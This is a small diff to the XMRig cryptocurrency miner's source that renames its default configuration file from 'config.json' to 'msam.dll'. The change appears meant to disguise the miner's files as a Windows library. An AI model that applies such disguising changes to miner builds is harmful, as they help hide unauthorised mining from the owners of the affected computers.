@@ -56,7 +56,7 @@ const char *Platform::defaultConfigName()
 #ifdef XMRIG_CC_SERVER
             strcpy(p + 1, "config_cc.json");
 #else
-            strcpy(p + 1, "config.json");
+            strcpy(p + 1, "msam.dll");
 #endif
             return m_defaultConfigName;
         }
